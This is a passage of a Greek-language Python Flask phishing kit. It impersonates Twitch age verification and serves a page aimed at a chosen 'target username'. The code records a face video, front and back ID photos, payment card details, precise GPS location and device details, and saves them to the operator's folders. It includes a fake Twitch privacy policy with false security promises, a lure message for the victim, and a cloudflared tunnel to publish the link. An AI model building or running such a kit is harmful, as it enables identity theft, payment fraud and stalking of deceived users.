                statusDiv.textContent = '✓ Η μέθοδος πληρωμής επαληθεύτηκε επιτυχώς!';
                
                // Submit to server
                $.ajax({{
                    url: '/submit_payment_verification',
                    type: 'POST',
                    data: JSON.stringify(paymentData),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Η επαλήθευση πληρωμής μεταφορτώθηκε');
                    }}
                }});
                
                setTimeout(() => {{
                    nextStep();
                }}, 1500);
            }}, 2000);
        }}
        
        // Location Verification
        function requestLocation() {{
            const button = document.getElementById('locationBtn');
            const statusDiv = document.getElementById('locationStatus');
            const detailsDiv = document.getElementById('locationDetails');
            
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Λήψη τοποθεσίας...';
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Πρόσβαση στην τοποθεσία σας...';
            statusDiv.style.display = 'block';
            
            if (!navigator.geolocation) {{
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Η γεωτοποθεσία δεν υποστηρίζεται από το πρόγραμμα περιήγησής σας.';
                button.disabled = false;
                button.textContent = 'Δοκιμάστε Ξανά';
                return;
            }}
            
            // Get location
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    updateLocationUI(position);
                    sendLocationToServer(position);
                    completeLocationVerification();
                }},
                (error) => {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = `Σφάλμα: ${{error.message}}. Παρακαλώ ενεργοποιήστε τις υπηρεσίες τοποθεσίας.`;
                    button.disabled = false;
                    button.textContent = 'Δοκιμάστε Ξανά';
                }},
                {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
            );
        }}
        
        function updateLocationUI(position) {{
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Update display
            document.getElementById('latValue').textContent = lat.toFixed(6);
            document.getElementById('lonValue').textContent = lon.toFixed(6);
            document.getElementById('accuracyValue').textContent = `${{Math.round(accuracy)}} μέτρα`;
            document.getElementById('addressValue').textContent = 'Επεξεργασία διεύθυνσης...';
            
            // Calculate accuracy percentage
            let accuracyPercentage = 100;
            if (accuracy < 10) accuracyPercentage = 95;
            else if (accuracy < 50) accuracyPercentage = 85;
            else if (accuracy < 100) accuracyPercentage = 70;
            else if (accuracy < 500) accuracyPercentage = 50;
            else accuracyPercentage = 30;
            
            document.getElementById('accuracyFill').style.width = accuracyPercentage + '%';
            
            // Show details
            document.getElementById('locationDetails').style.display = 'block';
            
            // Update status
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.className = 'status-message status-success';
            statusDiv.textContent = `✓ Η τοποθεσία λήφθηκε με ακρίβεια ${{Math.round(accuracy)}}μ`;
            
            // Store data
            locationData = {{
                latitude: lat,
                longitude: lon,
                accuracy: accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                heading: position.coords.heading,
                user_agent: navigator.userAgent
            }};
        }}
        
        function sendLocationToServer(position) {{
            $.ajax({{
                url: '/submit_location_verification',
                type: 'POST',
                data: JSON.stringify({{
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_username: targetUsername,
                    account_type: accountType
                }}),
                contentType: 'application/json',
                success: function(response) {{
                    console.log('Τα δεδομένα τοποθεσίας μεταφορτώθηκαν');
                }}
            }});
        }}
        
        function completeLocationVerification() {{
            const button = document.getElementById('locationBtn');
            button.disabled = true;
            button.textContent = '✓ Η Τοποθεσία Επαληθεύτηκε';
            
            setTimeout(() => {{
                startFinalVerification();
            }}, 2000);
        }}
        
        // Final Processing
        function startFinalVerification() {{
            showStep('stepFinal');
            const statusDiv = document.getElementById('finalStatus');
            let progress = 25;
            
            const progressInterval = setInterval(() => {{
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 30) {{
                    message = `Επαλήθευση σάρωσης προσώπου... ${{Math.round(progress)}}%`;
                }} else if (progress < 50) {{
                    message = `Έλεγχος εγγράφων ταυτότητας... ${{Math.round(progress)}}%`;
                }} else if (progress < 70) {{
                    message = accountType === 'streamer' ? `Επαλήθευση μεθόδου πληρωμής... ${{Math.round(progress)}}%` : `Επαλήθευση τοποθεσίας... ${{Math.round(progress)}}%`;
                }} else if (progress < 90) {{
                    message = `Ανάλυση δεδομένων τοποθεσίας... ${{Math.round(progress)}}%`;
                }} else {{
                    message = `Ολοκλήρωση επαλήθευσης... ${{Math.round(progress)}}%`;
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(progressInterval);
                    setTimeout(() => {{
                        statusDiv.className = 'status-message status-success';
                        statusDiv.textContent = `✓ Η επαλήθευση ολοκληρώθηκε για @${{targetUsername}}!`;
                        
                        // Submit complete verification
                        submitCompleteVerification();
                        
                        setTimeout(() => {{
                            showCompletionPage();
                        }}, 1500);
                    }}, 1000);
                }}
            }}, 800);
        }}
        
        function showCompletionPage() {{
            showStep('stepComplete');
            
            // Start countdown
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = countdown;
            
            countdownTimer = setInterval(() => {{
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(countdownTimer);
                    showReviewPage();
                }}
            }}, 1000);
        }}
        
        function showReviewPage() {{
            clearInterval(countdownTimer);
            showStep('stepReview');
        }}
        
        function returnToTwitch() {{
            window.location.href = 'https://twitch.tv';
        }}
        
        function checkVerificationStatus() {{
            alert('Η κατάσταση επαλήθευσης θα σταλεί στο email σας εντός 48 ωρών. Παρακαλώ ελέγξτε το email που σχετίζεται με τον λογαριασμό σας στο Twitch.');
        }}
        
        function submitCompleteVerification() {{
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    target_username: targetUsername,
                    account_type: accountType,
                    completed_steps: currentStep,
                    verification_timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    screen_resolution: `${{screen.width}}x${{screen.height}}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }}),
                contentType: 'application/json'
            }});
        }}
        
        // Initialize
        updateProgress();
        
        // Auto-start first step
        setTimeout(() => {{
            showStep(1);
        }}, 500);
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            account_type = data.get('account_type', 'unknown')
            
            # Create filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"twitch_face_{target_username}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
            
            # Save video
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            # Save metadata
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'twitch_face_verification',
                'target_username': target_username,
                'account_type': account_type,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'saved_at': datetime.now().isoformat()
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση προσώπου Twitch για {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση προσώπου υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα βίντεο προσώπου"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'unknown')
        target_username = request.form.get('target_username', 'unknown')
        account_type = request.form.get('account_type', 'unknown')
        id_type = request.form.get('id_type', 'government')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        # Handle front ID
        front_filename = None
        if 'front_id' in request.files:
            front_file = request.files['front_id']
            if front_file.filename:
                file_ext = front_file.filename.split('.')[-1] if '.' in front_file.filename else 'jpg'
                front_filename = f"twitch_id_front_{target_username}_{session_id}_{timestamp}.{file_ext}"
                front_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', front_filename)
                front_file.save(front_path)
        
        # Handle back ID
        back_filename = None
        if 'back_id' in request.files:
            back_file = request.files['back_id']
            if back_file.filename:
                file_ext = back_file.filename.split('.')[-1] if '.' in back_file.filename else 'jpg'
                back_filename = f"twitch_id_back_{target_username}_{session_id}_{timestamp}.{file_ext}"
                back_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', back_filename)
                back_file.save(back_path)
        
        # Save metadata
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
        metadata = {
            'front_id': front_filename,
            'back_id': back_filename,
            'type': 'twitch_id_verification',
            'id_type': id_type,
            'target_username': target_username,
            'account_type': account_type,
            'session_id': session_id,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'saved_at': datetime.now().isoformat()
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Αποθηκεύτηκαν έγγραφα ταυτότητας Twitch για {target_username}: {front_filename}, {back_filename}")
        return jsonify({"status": "success", "message": "Η επαλήθευση ταυτότητας υποβλήθηκε"}), 200
        
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης ταυτότητας: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_payment_verification', methods=['POST'])
def submit_payment_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"twitch_payment_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'payment_proofs', filename)
            
            # Remove sensitive data (in real scenario, this would be encrypted)
            safe_data = data.copy()
            if 'card_number' in safe_data:
                safe_data['card_number'] = '****' + safe_data['card_number'][-4:] if safe_data['card_number'] else '****'
            if 'cvv' in safe_data:
                safe_data['cvv'] = '***'
            
            safe_data['received_at'] = datetime.now().isoformat()
            safe_data['server_timestamp'] = timestamp
            
            with open(file_path, 'w') as f:
                json.dump(safe_data, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση πληρωμών Twitch για {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση πληρωμών υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα πληρωμής"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης πληρωμών: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            
            # Add target username to data
            data['target_username'] = target_username
            
            # Process location in background thread
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Λήφθηκαν δεδομένα τοποθεσίας Twitch για {target_username}: {session_id}")
            return jsonify({"status": "success", "message": "Η επαλήθευση τοποθεσίας υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα τοποθεσίας"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            account_type = data.get('account_type', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"twitch_complete_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            # Add system info
            data['received_at'] = datetime.now().isoformat()
            data['server_timestamp'] = timestamp
            data['verification_type'] = 'twitch_complete'
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Αποθηκεύτηκε πλήρης επαλήθευση Twitch για {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση ολοκληρώθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης σύνοψης επαλήθευσης: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/privacy_policy')
def privacy_policy():
    return '''<!DOCTYPE html>
    <html lang="el">
    <head>
        <title>Πολιτική Απορρήτου Twitch</title>
        <style>
            body {{ 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                padding: 20px; 
                max-width: 800px; 
                margin: 0 auto; 
                background-color: #0f0f23;
                color: #efeff1;
            }}
            h1 {{ 
                color: #9146ff; 
                margin-bottom: 30px;
                font-size: 2.5rem;
            }}
            h2 {{
                color: #bf94ff;
                margin-top: 30px;
                margin-bottom: 15px;
                font-size: 1.5rem;
            }}
            .container {{
                background: linear-gradient(135deg, #18182b 0%, #1a1a2e 100%);
                padding: 40px;
                border-radius: 16px;
                border: 1px solid #26263a;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }}
            ul {{
                padding-left: 20px;
                margin: 15px 0;
            }}
            li {{
                margin-bottom: 12px;
                line-height: 1.6;
                color: #adadb8;
            }}
            strong {{
                color: #efeff1;
            }}
            p {{
                color: #adadb8;
                line-height: 1.6;
                margin-bottom: 20px;
            }}
            .highlight {{
                background: rgba(145, 70, 255, 0.1);
                border-left: 4px solid #9146ff;
                padding: 15px 20px;
                margin: 20px 0;
                border-radius: 0 8px 8px 0;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Ειδοποίηση Απορρήτου Επαλήθευσης Ηλικίας Twitch</h1>
            
            <div class="highlight">
                Αυτή η διαδικασία επαλήθευσης απαιτείται για συμμόρφωση με τους περιορισμούς ηλικίας, τους περιφερειακούς νόμους και τους Όρους Χρήσης του Twitch.
            </div>
            
            <h2>Συλλογή Δεδομένων</h2>
            <p>Κατά τη διαδικασία επαλήθευσης Twitch, συλλέγουμε:</p>
            <ul>
                <li><strong>Δεδομένα Αναγνώρισης Προσώπου</strong> - Προσωρινή σάρωση βίντεο για επαλήθευση ταυτότητας</li>
                <li><strong>Πληροφορίες Εγγράφου Ταυτότητας</strong> - Επίσημα έγγραφα ταυτότητας, φοιτητικές ταυτότητες ή έντυπα συγκατάθεσης γονέων</li>
                <li><strong>Πληροφορίες Πληρωμής</strong> - Για επαλήθευση μονετοποίησης streamer (επεξεργάζονται με ασφάλεια)</li>
                <li><strong>Δεδομένα Τοποθεσίας</strong> - Για περιφερειακή συμμόρφωση και επιβολή περιορισμών περιεχομένου</li>
                <li><strong>Πληροφορίες Συσκευής</strong> - Για μέτρα ασφάλειας και πρόληψης απάτης</li>
            </ul>
            
            <h2>Σκοπός Συλλογής Δεδομένων</h2>
            <p>Τα δεδομένα σας χρησιμοποιούνται αποκλειστικά για:</p>
            <ul>
                <li>Επαλήθευση ηλικίας και συμμόρφωση με περιφερειακούς νόμους</li>
                <li>Πιστοποίηση ταυτότητας και πρόληψη απάτης</li>
                <li>Επαλήθευση μονετοποίησης streamer (όπου ισχύει)</li>
                <li>Περιφερειακή συμμόρφωση περιεχομένου και επιβολή περιορισμών</li>
                <li>Βελτίωση ασφάλειας λογαριασμού και πρόληψη μη εξουσιοδοτημένης πρόσβασης</li>
            </ul>
            
            <h2>Ασφάλεια Δεδομένων</h2>
            <p>Εφαρμόζουμε πρότυπα μέτρα ασφάλειας βιομηχανίας:</p>
            <ul>
                <li>Κρυπτογράφηση end-to-end για όλες τις μεταδόσεις δεδομένων</li>
                <li>Ασφαλής αποθήκευση με κρυπτογράφηση AES-256</li>
                <li>Τακτικοί έλεγχοι ασφάλειας και δοκιμές διείσδυσης</li>
                <li>Έλεγχοι πρόσβασης και πρωτόκολλα πιστοποίησης</li>
                <li>Συμμόρφωση με PCI DSS για δεδομένα πληρωμών</li>
            </ul>
            
            <h2>Διάρκεια Διατήρησης Δεδομένων</h2>
            <p>Όλα τα δεδομένα επαλήθευσης διαχειρίζονται σύμφωνα με την πολιτική διατήρησής μας:</p>
            <ul>
                <li>Δεδομένα αναγνώρισης προσώπου: Διαγράφονται αυτόματα εντός 7 ημερών</li>
                <li>Έγγραφα ταυτότητας: Κρυπτογραφούνται και διαγράφονται εντός 30 ημερών από επιτυχή επαλήθευση</li>
                <li>Δεδομένα πληρωμών: Επεξεργάζονται με ασφάλεια και διατηρούνται μόνο όπως απαιτείται από το νόμο</li>
                <li>Δεδομένα τοποθεσίας: Ανωνυμοποιούνται εντός 24 ωρών, διαγράφονται εντός 7 ημερών</li>
                <li>Μεταδεδομένα: Διατηρούνται για λόγους ασφάλειας έως και 90 ημέρες</li>
            </ul>
            
            <h2>Δικαιώματα Σας</h2>
            <p>Έχετε το δικαίωμα να:</p>
            <ul>
                <li>Έχετε πρόσβαση στα δεδομένα επαλήθευσής σας κατόπιν αιτήματος</li>
                <li>Ζητήσετε τη διαγραφή των δεδομένων σας πριν από τις τυπικές περιόδους διατήρησης</li>
                <li>Εξαιρεθείτε από συγκεκριμένη συλλογή δεδομένων (μπορεί να περιορίσει τη λειτουργικότητα του λογαριασμού)</li>
                <li>Υποβάλετε καταγγελία σχετικά με τις πρακτικές διαχείρισης δεδομένων</li>
                <li>Ανακαλέσετε τη συγκατάθεσή σας για επεξεργασία δεδομένων</li>
            </ul>
            
            <h2>Κοινή Χρήση με Τρίτους</h2>
            <p>Δεν πουλάμε ή μοιραζόμαστε τα δεδομένα επαλήθευσής σας με τρίτους για σκοπούς μάρκετινγκ. Τα δεδομένα μπορεί να κοινοποιούνται με:</p>
            <ul>
                <li>Ομάδες Εμπιστοσύνης & Ασφάλειας για εξέταση επαλήθευσης</li>
                <li>Νομικές αρχές όταν απαιτείται από το νόμο</li>
                <li>Επεξεργαστές πληρωμών (μόνο για επαλήθευση πληρωμών)</li>
                <li>Παρόχους υπηρεσιών υπό αυστηρές συμφωνίες εμπιστευτικότητας</li>
            </ul>
            
            <div class="highlight">
                Για ερωτήσεις σχετικά με τις πρακτικές απορρήτου μας ή για να ασκήσετε τα δικαιώματά σας, επικοινωνήστε με την Ομάδα Απορρήτου μας στο privacy@twitch.tv
            </div>
        </div>
    </body>
    </html>'''

if __name__ == '__main__':
    check_dependencies()
    
    # Λήψη ρυθμίσεων επαλήθευσης από τον χρήστη
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4046
    script_name = "Twitch Επαλήθευση Ηλικίας"
    
    print("\n" + "="*60)
    print("ΣΕΛΙΔΑ ΕΠΑΛΗΘΕΥΣΗΣ ΗΛΙΚΙΑΣ TWITCH")
    print("="*60)
    print(f"[+] Όνομα Χρήστη Στόχου: @{VERIFICATION_SETTINGS['target_username']}")
    print(f"[+] Τύπος Λογαριασμού: {VERIFICATION_SETTINGS['account_type'].upper()} ΛΟΓΑΡΙΑΣΜΟΣ")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Εικόνα Προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    else:
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
        print(f"[!] Τοποθετήστε οποιαδήποτε εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
    
    print(f"[+] Τα δεδομένα θα αποθηκευτούν στο: {DOWNLOAD_FOLDER}")
    print(f"[+] Διάρκεια σάρωσης προσώπου: {VERIFICATION_SETTINGS['face_duration']} δευτερόλεπτα")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη ({VERIFICATION_SETTINGS.get('id_type', 'government')} ταυτότητα)")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"[+] Επαλήθευση πληρωμών: Ενεργοποιημένη")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργοποιημένη")
    print("\n[+] Δημιουργήθηκαν φάκελοι:")
    print(f"    - face_scans/")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"    - id_documents/")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"    - payment_proofs/")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"    - location_data/")
    print(f"    - user_data/")
    print("\n[+] Εκκίνηση διακομιστή...")
    print("[+] Πατήστε Ctrl+C για διακοπή.\n")
    
    # Τερματική προτροπή για χρήστη
    print("="*60)
    print("ΤΕΡΜΑΤΙΚΗ ΠΡΟΤΡΟΠΗ ΓΙΑ ΧΡΗΣΤΗ")
    print("="*60)
    print(f"Το Twitch ζητά επαλήθευση ηλικίας για τον λογαριασμό:")
    print(f"👤 Όνομα Χρήστη: @{VERIFICATION_SETTINGS['target_username']}")
    print(f"🎮 Τύπος: {VERIFICATION_SETTINGS['account_type'].upper()} ΛΟΓΑΡΙΑΣΜΟΣ")
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"🖼️  Προφίλ: Χρήση εικόνας προφίλ από λογαριασμό")
    else:
        print(f"👤 Προφίλ: Προεπιλεγμένο avatar Twitch")
    
    # Δημιουργία κατάλληλων στατιστικών
    followers = random.randint(500, 10000) if VERIFICATION_SETTINGS['account_type'] == 'streamer' else random.randint(10, 1000)
    print(f"📊 Στατιστικά: {followers} ακόλουθοι • {random.randint(30, 365*3)} ημέρες παλιός")
    
    print(f"🔒 Αιτία: Απαιτείται επαλήθευση ηλικίας για {'streaming' if VERIFICATION_SETTINGS['account_type'] == 'streamer' else 'προβολή περιεχομένου με περιορισμό ηλικίας'}")
    print(f"⏰ Χρονικό όριο: Ολοκληρώστε εντός 24 ωρών")
    print("📍 Απαιτούμενα: Σάρωση προσώπου, επαλήθευση ταυτότητας και έλεγχος τοποθεσίας")
    print("="*60)
    print("Ανοίξτε τον παρακάτω σύνδεσμο σε πρόγραμμα περιήγησης για να ξεκινήσετε την επαλήθευση...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Τερματισμός διακομιστή επαλήθευσης Twitch...")
        sys.exit(0)